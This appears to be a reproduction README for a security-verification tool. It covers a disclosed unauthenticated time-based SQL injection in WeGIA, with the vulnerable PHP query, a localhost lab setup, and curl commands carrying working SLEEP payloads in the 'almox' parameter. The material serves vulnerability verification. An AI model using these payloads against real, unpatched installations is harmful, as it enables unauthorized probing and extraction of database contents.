# GHSA-pmf9-2rc3-vvxx

Unauthenticated time-based blind SQL injection in [WeGIA](https://github.com/LabRedesCefetRJ/WeGIA)
`<= 3.3.3` (`CVE-2025-53091`, CVSS 10.0). `controle/getProdutosPorAlmox.php` reads
`$_REQUEST['almox']` and concatenates it raw into a MySQL query in **numeric context**
(no quotes, no sanitization), executed via `mysqli_query`:

```php
$almox = $_REQUEST['almox'];
$query = mysqli_query($conexao,
  "SELECT ... FROM produto, estoque WHERE produto.id_produto=estoque.id_produto
   AND estoque.qtd>0 AND estoque.id_almoxarifado=$almox");
```

The endpoint requires no auth and MySQL supports `SLEEP()`, so an injected
`SLEEP(5)` holds the response while body and status stay constant. Fixed in `3.4.0`.

Sources:

- https://github.com/LabRedesCefetRJ/WeGIA/security/advisories/GHSA-pmf9-2rc3-vvxx
- https://osv.dev/vulnerability/GHSA-pmf9-2rc3-vvxx

## Reproduce

```bash
# MySQL via Docker
docker run -d --name wegia-mysql -e MYSQL_ALLOW_EMPTY_PASSWORD=yes -e MYSQL_DATABASE=wegia \
  -p 127.0.0.1:3306:3306 mysql:8.0

git clone --branch 3.3.3 https://github.com/LabRedesCefetRJ/WeGIA.git
cd WeGIA
# wait for mysql, then load schema + an app user
docker exec -i wegia-mysql mysql -uroot < BD/wegia001.sql
docker exec -i wegia-mysql mysql -uroot < BD/wegia002.sql
docker exec -i wegia-mysql mysql -uroot -e "CREATE USER 'wegia'@'%' IDENTIFIED BY 'wegia'; GRANT ALL ON wegia.* TO 'wegia'@'%'; FLUSH PRIVILEGES;"
# the SLEEP subquery is evaluated per joined row, so seed one product + stock row:
docker exec -i wegia-mysql mysql -uroot wegia -e "SET FOREIGN_KEY_CHECKS=0;
  INSERT IGNORE INTO categoria_produto (id_categoria_produto) VALUES (1);
  INSERT IGNORE INTO unidade (id_unidade) VALUES (1);
  INSERT IGNORE INTO produto (id_produto,id_categoria_produto,id_unidade,descricao,codigo,preco,oculto) VALUES (1,1,1,'Test Product','P001',9.99,0);
  INSERT IGNORE INTO estoque (id_produto,id_almoxarifado,qtd) VALUES (1,1,10);"

# config.php is generated by the installer; write the minimal DB config the endpoint needs:
cat > config.php <<'PHP'
<?php
define('DB_NAME','wegia'); define('DB_USER','wegia'); define('DB_PASSWORD','wegia');
define('DB_HOST','127.0.0.1'); define('DB_CHARSET','utf8');
define('ROOT', dirname(__FILE__)); define('BKP_DIR','/tmp'); define('WWW','http://127.0.0.1:8989/');
PHP

php -S 127.0.0.1:8989 -t .
```

Manual check:

```bash
E='http://127.0.0.1:8989/controle/getProdutosPorAlmox.php'
curl -s --get "$E" --data-urlencode 'almox=0 OR (SELECT 1 FROM (SELECT SLEEP(5))x)' -o /dev/null -w '%{time_total}\n'  # ~5s
curl -s --get "$E" --data-urlencode 'almox=0 OR (SELECT 1 FROM (SELECT SLEEP(0))x)' -o /dev/null -w '%{time_total}\n'  # ~0s
```

In another terminal from the `nocapsec` repo:

```bash
nocapsec verify -internal examples/sqli-time-based-wegia/evidence.json
```

The evidence is one `base_request` plus an `injection` slot (`query` param `almox`)
and three payload values (control / `SLEEP(0)` / `SLEEP(5)`). The engine builds the
three arms by planting each value into that one slot, then replays them in randomized,
repeated order. A verified report (`delta_ms` ≈ 5000 over a 3500 ms threshold, identical
body/status) proves the injected `SLEEP` executed in the database. The `(SELECT SLEEP(n))`
subquery form makes the delay fire exactly once regardless of matched rows.
